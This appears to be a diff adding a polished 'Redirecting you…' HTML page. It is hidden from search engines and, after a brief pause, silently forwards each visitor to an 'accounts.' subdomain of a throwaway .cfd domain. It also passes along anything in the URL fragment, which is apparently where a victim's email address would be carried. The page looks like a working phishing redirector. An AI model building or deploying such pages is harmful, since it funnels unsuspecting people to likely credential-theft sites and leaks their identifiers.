@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Redirecting…</title>
+    <style>
+        :root {
+            --bg-1: #0f172a;
+            --bg-2: #1e293b;
+            --accent: #38bdf8;
+            --accent-soft: rgba(56, 189, 248, 0.15);
+            --text: #e2e8f0;
+            --muted: #94a3b8;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: radial-gradient(circle at 50% 30%, var(--bg-2), var(--bg-1) 70%);
+            color: var(--text);
+            display: grid;
+            place-items: center;
+            padding: 24px;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            padding: 40px 32px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(8px);
+            animation: rise 0.5s ease-out both;
+        }
+
+        @keyframes rise {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .spinner {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 28px;
+            border-radius: 50%;
+            border: 3px solid var(--accent-soft);
+            border-top-color: var(--accent);
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        h1 {
+            font-size: 1.35rem;
+            font-weight: 600;
+            letter-spacing: 0.2px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: var(--muted);
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .target {
+            margin-top: 18px;
+            padding: 10px 14px;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.25);
+            font-size: 0.8rem;
+            color: var(--muted);
+            word-break: break-all;
+        }
+
+        .fallback {
+            display: none;
+            margin-top: 24px;
+        }
+
+        .fallback a {
+            display: inline-block;
+            padding: 12px 22px;
+            border-radius: 10px;
+            background: var(--accent);
+            color: #04263a;
+            font-weight: 600;
+            text-decoration: none;
+            transition: filter 0.15s ease, transform 0.15s ease;
+        }
+
+        .fallback a:hover {
+            filter: brightness(1.08);
+            transform: translateY(-1px);
+        }
+
+        body.stuck .spinner {
+            animation-duration: 2.5s;
+            border-top-color: var(--muted);
+        }
+
+        body.stuck .fallback {
+            display: block;
+        }
+    </style>
+</head>
+
+<body>
+    <main class="card" role="status" aria-live="polite">
+        <div class="spinner" aria-hidden="true"></div>
+        <h1>Redirecting you…</h1>
+        <p>Hang tight, we're sending you on your way.</p>
+        <div class="target" id="target"></div>
+        <div class="fallback" id="fallback">
+            <p>Not moving?</p>
+            <a id="fallbackLink" href="#" rel="noopener">Continue manually</a>
+        </div>
+    </main>
+
+    <script>
+        (function () {
+            "use strict";
+
+            const DEFAULT_TARGET = "https://accounts.egds2swgroup.cfd?n6TSlGg=cnpmYw==";
+            const REDIRECT_DELAY = 400;   // ms — brief pause so the UI is visible
+            const STUCK_TIMEOUT = 5000;   // ms — offer a manual link if still here
+
+            function buildTarget() {
+                const base = new URL(DEFAULT_TARGET);
+                // Everything after the first "#" is forwarded to the target.
+                const fragment = window.location.hash.replace(/^#/, "");
+                if (fragment) {
+                    base.hash = fragment;
+                }
+                return base.toString();
+            }
+
+            const url = buildTarget();
+
+            const targetEl = document.getElementById("target");
+            targetEl.textContent = url;
+
+            const fallbackLink = document.getElementById("fallbackLink");
+            fallbackLink.href = url;
+
+            setTimeout(function () {
+                window.location.replace(url);
+            }, REDIRECT_DELAY);
+
+            setTimeout(function () {
+                document.body.classList.add("stuck");
+            }, STUCK_TIMEOUT);
+        })();
+    </script>
+
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"6ca6ff28a69d44fba4702225bf94b78d","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+
+</html>
